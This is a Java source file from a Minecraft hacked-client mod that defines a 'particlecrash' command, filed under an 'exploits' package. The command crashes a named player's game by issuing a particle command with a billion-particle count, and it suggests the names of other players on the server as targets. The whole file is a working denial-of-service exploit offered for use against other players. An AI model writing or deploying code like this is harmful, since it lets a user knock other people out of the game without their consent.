package net.como.client.commands.exploits;

import java.util.ArrayList;
import java.util.List;

import net.como.client.ComoClient;
import net.como.client.commands.structures.Command;
import net.como.client.utils.ChatUtils;
import net.como.client.utils.ServerUtils;
import net.minecraft.entity.player.PlayerEntity;

public class ParticleCrash extends Command {

    public ParticleCrash() {
        super("particlecrash", "Crashes a given player using particles", "particlecrash <player>");
    }
    
    private void crashPlayer(String playerName) {
        ChatUtils.sendChatMessage(
            "/particle sweep_attack ~ ~ ~ ~ ~ ~ 40 1000000000 force " + playerName
        );
    }

    @Override
    public Boolean handleHelp(String[] args) {
        return args.length != 1;
    }

    @Override
    public Boolean trigger(String[] args) {
        if (this.handleHelp(args)) return true;

        // Get the player's name
        String playerName = args[0];

        // Crash the player
        this.crashPlayer(playerName);

        return true;
    }

    @Override
    public List<String> getSuggestions() {
        List<String> suggestions = new ArrayList<>();

        // Get all the players
        for (PlayerEntity player : ComoClient.getClient().world.getPlayers()) {
            String name = player.getEntityName();

            // Don't add yourself
            if (name.equals(ComoClient.getClient().player.getEntityName())) continue;
            
            // Add the player
            suggestions.add(name);
        }

        return suggestions;
    }
}
